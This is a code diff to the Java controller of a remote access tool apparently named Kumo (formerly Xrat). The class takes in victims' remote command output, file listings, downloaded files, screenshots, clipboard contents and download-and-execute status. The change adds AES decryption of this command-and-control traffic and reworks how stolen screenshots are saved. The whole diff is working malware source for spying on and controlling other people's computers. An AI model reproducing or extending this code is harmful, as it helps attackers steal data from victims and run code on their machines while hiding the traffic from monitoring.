@@ -5,6 +5,7 @@ import GUI.Controller;
 import GUI.Views.*;
 import Logger.Level;
 import Logger.Logger;
+import Server.Data.CryptoUtils;
 import Server.Data.PseudoBase;
 import Server.Data.Repository;
 import javafx.application.Platform;
@@ -12,10 +13,7 @@ import javafx.scene.Scene;
 import javafx.stage.Stage;
 import javafx.stage.StageStyle;
 
-import javax.imageio.ImageIO;
-import java.awt.image.BufferedImage;
 import java.io.*;
-import java.util.Date;
 
 class ProcessCommands implements Repository {
 
@@ -26,22 +24,23 @@ class ProcessCommands implements Repository {
         while (true) {
             String input;
             try {
-                input = dis.readUTF();
+                input = readFromDis(dis);
             } catch (EOFException e) {
                 Logger.log(Level.ERROR, e.toString());
                 break;
             }
             /* Reads back the output from a remote execution */
             if (input.contains("CMD")) {
-                int outputCount = dis.readInt();
+                int outputCount = Integer.parseInt(readFromDis(dis));
+                Logger.log(Level.INFO, "CMD length: " + outputCount);
                 StringBuilder sb = new StringBuilder();
                 for (int i = 0; i < outputCount; i++) {
-                    sb.append(dis.readUTF()).append("\n");
+                    sb.append(readFromDis(dis)).append("\n");
                 }
                 SendCommandView.getConsole().appendText(sb.toString());
                 /* Sends back the System OS to KUMO */
             } else if (input.contains("SYS")) {
-                String SYSTEMOS = dis.readUTF();
+                String SYSTEMOS = readFromDis(dis);
                 client.setSYSTEM_OS(SYSTEMOS);
                 /* Goes up a directory in the file explorer (returns files) */
             } else if (input.contains("DIRECTORYUP")) {
@@ -51,16 +50,26 @@ class ProcessCommands implements Repository {
                 client.clientCommunicate("FILELIST");
                 /* Gets list of files in current directory in file explorer */
             } else if (input.contains("SCREENSHOT")) {
-                client.clientCommunicate("SCREENSHOT");
-                BufferedImage im = ImageIO.read(new ByteArrayInputStream(dis.readUTF().getBytes()));
-                ImageIO.write(im, "PNG", new File("./data/Screenshot" + new Date(System.currentTimeMillis()) + ".png"));
-
+                // SERVER: SCREENSHOT
+                // CLIENT: filename
+                // CLIENT: b64.encode(file).length
+                // CLIENT: base64.encode(file).bytes[n]
+                String fname = readFromDis(dis);
+                String saveDirectory = FileContextMenu.selectedDirectory;
+                long fileLength = dis.readLong();
+                File downloadedFile = new File(saveDirectory + fname);
+                Logger.log(Level.INFO, "Saving screenshot to " + saveDirectory + fname);
+                FileOutputStream fos = new FileOutputStream(downloadedFile);
+                BufferedOutputStream bos = new BufferedOutputStream(fos);
+                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
+                bos.close();
+                fos.close();
             } else if (input.contains("FILELIST")) {
-                String pathName = dis.readUTF();
+                String pathName = readFromDis(dis);
                 int filesCount = dis.readInt();
                 String[] fileNames = new String[filesCount];
                 for (int i = 0; i < filesCount; i++) {
-                    fileNames[i] = dis.readUTF();
+                    fileNames[i] = readFromDis(dis);
                 }
                 Platform.runLater(() -> {
                     if (fileExplorer[0] == null) {
@@ -77,7 +86,7 @@ class ProcessCommands implements Repository {
             } else if (input.contains("DOWNLOAD")) {
                 String saveDirectory = FileContextMenu.selectedDirectory;
                 long fileLength = dis.readLong();
-                String fileName = dis.readUTF();
+                String fileName = readFromDis(dis);
                 File downloadedFile = new File(saveDirectory + "/" + fileName);
                 FileOutputStream fos = new FileOutputStream(downloadedFile);
                 BufferedOutputStream bos = new BufferedOutputStream(fos);
@@ -85,7 +94,7 @@ class ProcessCommands implements Repository {
                 bos.close();
                 fos.close();
             }
-            /* Uninstall and close remote server - remove from Xrat */
+            /* Uninstall and close remote server - remove from Kumo */
             else if (input.contains("EXIT")) {
                 PseudoBase.getKumoData().remove(client.getIP());
                 CONNECTIONS.remove(client.getIP());
@@ -94,14 +103,14 @@ class ProcessCommands implements Repository {
                 client.getClient().close();
                 break;
             } else if (input.contains("SYINFO")){
-                String data = dis.readUTF();
+                String data = readFromDis(dis);
                 Logger.log(Level.INFO, "SYSINFO: \n" + data);
                 SysInfoView.getArea().appendText(data);
             } else if (input.contains("BEACON")) {
                 client.setOnlineStatus("Online");
             } else if (input.contains("DAE")){
                 System.out.println("OH YEA DAE IS FUN");
-                int status = Integer.parseInt(dis.readUTF());
+                int status = Integer.parseInt(readFromDis(dis));
                 System.out.println("DOWNLOAD AND EXECUTE STATUS: " + status);
                 if (status == 0){
                     DownloadAndExecuteView.setStatusLabelColor("red");
@@ -115,8 +124,16 @@ class ProcessCommands implements Repository {
 
             /** clipboard stuff **/
             else if (input.contains("CLIPGET")){
-                GetClipboardView.getData().appendText("Clipboard data: \n\n" + dis.readUTF());
+                GetClipboardView.getData().appendText("Clipboard data: \n\n" + readFromDis(dis));
             }
         }
+    }
+
+    private static String readFromDis(DataInputStream dis) throws IOException {
+        return CryptoUtils.decrypt(dis.readUTF(), KumoSettings.AES_KEY);
+    }
+
+    private static Long readLongFromDisNoEnc(DataInputStream dis) throws IOException{
+        return dis.readLong();
     }
 }
